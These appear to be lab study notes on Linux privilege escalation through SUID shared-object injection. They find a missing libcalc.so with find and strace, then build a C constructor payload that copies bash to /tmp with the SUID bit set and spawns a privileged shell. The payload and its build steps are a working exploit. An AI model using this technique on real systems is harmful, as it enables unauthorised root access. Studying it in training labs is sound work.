
## Detection

**Linux VM**

1. List all SUID binaries:
   ```bash
   find / -type f -perm -04000 -ls 2>/dev/null
   ```

![[Pasted image 20240917200258.png]]

2. Identify any missing `.so` files from a writable directory:
   ```bash
   strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
   ```

![[Pasted image 20240917200610.png]]
a system call trace (likely from `strace`) that shows the result of attempting to open a file. Here's the breakdown:

```
open("/home/user/.config/libcalc.so", O_RDONLY)
```

- - This is a call to the `open()` system function.
    - The first argument is the path to the file: `"/home/user/.config/libcalc.so"`.
    - The second argument, `O_RDONLY`, is a flag indicating that the file is being opened for read-only access.
- `= -1 ENOENT (No such file or directory)`:
    
    - The `= -1` indicates that the `open()` call failed, as -1 is the return value for an error.
    - `ENOENT` is the error code that means "Error NO ENTity"—essentially, the file or directory does not exist.
    - The message `(No such file or directory)` clarifies this.

Backend: The system call checks the specified path in the file system. If the file doesn't exist, the kernel returns `ENOENT`


## Exploitation

**Linux VM**

1. Create a writable directory:
   ```bash
   mkdir /home/user/.config
   cd /home/user/.config
   ```
2. Create a C file to inject code:
   ```c
   #include <stdio.h>
   #include <stdlib.h>

   static void inject() __attribute__((constructor));

   void inject() {
       system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
   }
   ```
3. Save the file as `libcalc.c`.
4. Compile the shared object:
   ```bash
   gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
   ```
5. Run the SUID binary:
   ```bash
   /usr/local/bin/suid-so
   ```
6. Check your user ID:
   ```bash
   id
   ```
![[Pasted image 20240917201315.png]]